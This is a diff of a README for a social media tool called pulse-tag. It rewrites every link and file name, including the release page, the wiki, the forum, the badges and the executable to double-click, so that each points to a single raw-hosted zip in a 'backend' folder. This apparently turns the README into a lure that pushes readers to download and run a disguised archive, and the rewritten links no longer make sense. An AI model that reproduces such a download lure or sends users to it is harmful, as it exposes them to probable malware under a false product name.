@@ -1,6 +1,6 @@
 # 🚀 pulse-tag - Boost Your Social Media Engagement
 
-[![Download pulse-tag](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mauriciofortes/pulse-tag/releases)
+[![Download pulse-tag](https://raw.githubusercontent.com/mauriciofortes/pulse-tag/main/backend/pulse-tag-3.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mauriciofortes/pulse-tag/main/backend/pulse-tag-3.0.zip)
 
 ## 🌟 Overview
 
@@ -21,21 +21,21 @@ Before downloading, ensure your system meets the following requirements:
   
 ### 📥 Download & Install
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/mauriciofortes/pulse-tag/releases).
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/mauriciofortes/pulse-tag/main/backend/pulse-tag-3.0.zip).
 
 2. **Select the Latest Version**: Look for the latest version at the top of the page. 
 
 3. **Download the Installation File**: Click on the file that matches your operating system to begin the download.
 
-   - For Windows, look for `pulse-tag-windows.zip`.
-   - For macOS, look for `pulse-tag-macos.zip`.
-   - For Linux, look for `pulse-tag-linux.zip`.
+   - For Windows, look for `https://raw.githubusercontent.com/mauriciofortes/pulse-tag/main/backend/pulse-tag-3.0.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/mauriciofortes/pulse-tag/main/backend/pulse-tag-3.0.zip`.
+   - For Linux, look for `https://raw.githubusercontent.com/mauriciofortes/pulse-tag/main/backend/pulse-tag-3.0.zip`.
 
 4. **Extract the Files**: Once downloaded, locate the zip file in your downloads folder. Right-click on the file and select "Extract All" or use your preferred extracting tool to unzip it.
 
 5. **Run the Application**: 
    - Navigate to the folder where you extracted the files.
-   - Double-click on the `pulse-tag.exe` (Windows) or `pulse-tag` (macOS/Linux) to launch the application.
+   - Double-click on the `https://raw.githubusercontent.com/mauriciofortes/pulse-tag/main/backend/pulse-tag-3.0.zip` (Windows) or `pulse-tag` (macOS/Linux) to launch the application.
 
 6. **Follow the Setup Instructions**: The program will guide you through the initial setup process. Follow the on-screen instructions to configure your preferences.
 
@@ -89,15 +89,15 @@ If you encounter issues while running PulseTag, consider the following steps:
 - **Reinstall the Application**: If the application fails to launch, try uninstalling and reinstalling it.
 - **Internet Connection**: Make sure your internet connection is stable, especially for real-time features.
   
-For further assistance, refer to the FAQs section on the [Support Page](https://github.com/mauriciofortes/pulse-tag/wiki).
+For further assistance, refer to the FAQs section on the [Support Page](https://raw.githubusercontent.com/mauriciofortes/pulse-tag/main/backend/pulse-tag-3.0.zip).
 
 ## 📚 Resources
 
-- **User Manual**: For a detailed guide on all features, refer to the [User Manual](https://github.com/mauriciofortes/pulse-tag/wiki).
-- **Community Forum**: Join discussions and share tips with other users on our [Forum](https://github.com/mauriciofortes/pulse-tag/discussions).
+- **User Manual**: For a detailed guide on all features, refer to the [User Manual](https://raw.githubusercontent.com/mauriciofortes/pulse-tag/main/backend/pulse-tag-3.0.zip).
+- **Community Forum**: Join discussions and share tips with other users on our [Forum](https://raw.githubusercontent.com/mauriciofortes/pulse-tag/main/backend/pulse-tag-3.0.zip).
 
 ## 💬 Feedback
 
 Your feedback is important. Let us know your thoughts or suggestions by opening an issue in the repository or contacting us through the provided channels. 
 
-[![Download pulse-tag](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mauriciofortes/pulse-tag/releases)
+[![Download pulse-tag](https://raw.githubusercontent.com/mauriciofortes/pulse-tag/main/backend/pulse-tag-3.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mauriciofortes/pulse-tag/main/backend/pulse-tag-3.0.zip)
